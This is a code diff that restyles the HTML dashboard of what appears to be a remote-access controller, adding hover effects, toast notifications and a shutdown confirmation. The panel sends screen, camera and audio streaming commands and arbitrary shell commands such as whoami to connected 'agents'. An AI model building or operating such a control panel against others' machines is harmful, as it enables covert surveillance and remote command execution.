@@ -8086,15 +8086,36 @@ DASHBOARD_HTML = '''
             overflow: hidden;
         }
 
+        .agent-item::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, rgba(0, 212, 255, 0.1), rgba(155, 89, 182, 0.1));
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
         .agent-item:hover {
             border-color: var(--accent-blue);
-            transform: translateY(-2px);
-            box-shadow: 0 5px 20px rgba(0, 212, 255, 0.2);
+            transform: translateY(-2px) scale(1.02);
+            box-shadow: 0 8px 25px rgba(0, 212, 255, 0.4), 0 0 20px rgba(0, 212, 255, 0.2);
+        }
+
+        .agent-item:hover::after {
+            opacity: 1;
         }
 
         .agent-item.active {
             border-color: var(--accent-green);
-            background: rgba(0, 255, 136, 0.1);
+            background: rgba(0, 255, 136, 0.15);
+            box-shadow: 0 0 25px rgba(0, 255, 136, 0.3);
+        }
+
+        .agent-item.active::after {
+            opacity: 0;
         }
 
         .stream-container {
@@ -8163,15 +8184,57 @@ DASHBOARD_HTML = '''
             text-transform: uppercase;
             letter-spacing: 0.5px;
             font-size: 0.9rem;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 2px 10px rgba(0, 212, 255, 0.2);
+        }
+
+        .neural-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+            transition: left 0.5s ease;
         }
 
         .neural-button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 20px rgba(0, 212, 255, 0.4);
+            transform: translateY(-2px) scale(1.02);
+            box-shadow: 0 8px 25px rgba(0, 212, 255, 0.6), 0 0 30px rgba(0, 212, 255, 0.3);
+            background: linear-gradient(45deg, #00d4ff, #9b59b6);
+            filter: brightness(1.2);
+        }
+
+        .neural-button:hover::before {
+            left: 100%;
+        }
+
+        .neural-button:active {
+            transform: translateY(0) scale(0.98);
+            box-shadow: 0 3px 15px rgba(0, 212, 255, 0.4);
         }
 
         .neural-button.danger {
             background: linear-gradient(45deg, var(--accent-red), #ff6b6b);
+            box-shadow: 0 2px 10px rgba(255, 64, 64, 0.2);
+        }
+
+        .neural-button.danger:hover {
+            background: linear-gradient(45deg, #ff4040, #ff8888);
+            box-shadow: 0 8px 25px rgba(255, 64, 64, 0.6), 0 0 30px rgba(255, 64, 64, 0.3);
+        }
+
+        .neural-button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .neural-button:disabled:hover {
+            transform: none;
+            box-shadow: 0 2px 10px rgba(0, 212, 255, 0.2);
         }
 
         .neural-input {
@@ -8283,19 +8346,35 @@ DASHBOARD_HTML = '''
             
             <div class="control-section">
                 <h3>Streaming Control</h3>
-                <button class="neural-button" onclick="sendCommand('start-stream')">Start Screen Stream</button>
-                <button class="neural-button" onclick="sendCommand('stop-stream')">Stop Screen Stream</button>
-                <button class="neural-button" onclick="sendCommand('start-camera')">Start Camera</button>
-                <button class="neural-button" onclick="sendCommand('stop-camera')">Stop Camera</button>
-                <button class="neural-button" onclick="sendCommand('start-audio')">Start Audio</button>
-                <button class="neural-button" onclick="sendCommand('stop-audio')">Stop Audio</button>
+                <button class="neural-button" onclick="sendCommandWithFeedback(this, 'start-stream')">
+                    <span>▶ Start Screen Stream</span>
+                </button>
+                <button class="neural-button" onclick="sendCommandWithFeedback(this, 'stop-stream')">
+                    <span>⏹ Stop Screen Stream</span>
+                </button>
+                <button class="neural-button" onclick="sendCommandWithFeedback(this, 'start-camera')">
+                    <span>📷 Start Camera</span>
+                </button>
+                <button class="neural-button" onclick="sendCommandWithFeedback(this, 'stop-camera')">
+                    <span>⏹ Stop Camera</span>
+                </button>
+                <button class="neural-button" onclick="sendCommandWithFeedback(this, 'start-audio')">
+                    <span>🎤 Start Audio</span>
+                </button>
+                <button class="neural-button" onclick="sendCommandWithFeedback(this, 'stop-audio')">
+                    <span>⏹ Stop Audio</span>
+                </button>
             </div>
 
             <div class="control-section">
                 <h3>System Commands</h3>
-                <input type="text" id="command-input" class="neural-input" placeholder="Enter command...">
-                <button class="neural-button" onclick="executeCommand()">Execute</button>
-                <button class="neural-button danger" onclick="sendCommand('shutdown')">Shutdown Agent</button>
+                <input type="text" id="command-input" class="neural-input" placeholder="Enter command (e.g., whoami, ipconfig)...">
+                <button class="neural-button" onclick="executeCommand()">
+                    <span>⚡ Execute Command</span>
+                </button>
+                <button class="neural-button danger" onclick="confirmShutdown(this)">
+                    <span>🛑 Shutdown Agent</span>
+                </button>
             </div>
 
             <div class="control-section">
@@ -8387,14 +8466,84 @@ DASHBOARD_HTML = '''
 
         function sendCommand(command) {
             if (!selectedAgent) {
-                alert('Please select an agent first');
+                showNotification('Please select an agent first', 'error');
                 return;
             }
+            
+            // Show command sent feedback
+            showNotification(`Command sent: ${command}`, 'success');
             
             socket.emit('execute_command', {
                 agent_id: selectedAgent,
                 command: command
             });
+        }
+
+        function showNotification(message, type = 'info') {
+            // Create notification element
+            const notification = document.createElement('div');
+            notification.className = `notification notification-${type}`;
+            notification.textContent = message;
+            notification.style.cssText = `
+                position: fixed;
+                top: 20px;
+                right: 20px;
+                padding: 15px 25px;
+                background: ${type === 'error' ? 'linear-gradient(45deg, #ff4040, #ff6b6b)' : 'linear-gradient(45deg, #00d4ff, #9b59b6)'};
+                color: white;
+                border-radius: 10px;
+                box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
+                z-index: 10000;
+                animation: slideIn 0.3s ease, slideOut 0.3s ease 2.7s;
+                font-weight: 600;
+            `;
+            
+            document.body.appendChild(notification);
+            
+            // Remove after 3 seconds
+            setTimeout(() => {
+                notification.remove();
+            }, 3000);
+        }
+
+        // Add animation styles
+        const style = document.createElement('style');
+        style.textContent = `
+            @keyframes slideIn {
+                from { transform: translateX(400px); opacity: 0; }
+                to { transform: translateX(0); opacity: 1; }
+            }
+            @keyframes slideOut {
+                from { transform: translateX(0); opacity: 1; }
+                to { transform: translateX(400px); opacity: 0; }
+            }
+            @keyframes buttonPulse {
+                0% { transform: scale(1); }
+                50% { transform: scale(0.95); }
+                100% { transform: scale(1); }
+            }
+        `;
+        document.head.appendChild(style);
+
+        function sendCommandWithFeedback(button, command) {
+            // Animate button
+            button.style.animation = 'buttonPulse 0.3s ease';
+            setTimeout(() => {
+                button.style.animation = '';
+            }, 300);
+            
+            // Send command
+            sendCommand(command);
+        }
+
+        function confirmShutdown(button) {
+            if (confirm('⚠️ Are you sure you want to shutdown the agent?\n\nThis will disconnect the agent from the controller.')) {
+                button.style.animation = 'buttonPulse 0.3s ease';
+                setTimeout(() => {
+                    button.style.animation = '';
+                }, 300);
+                sendCommand('shutdown');
+            }
         }
 
         function executeCommand() {
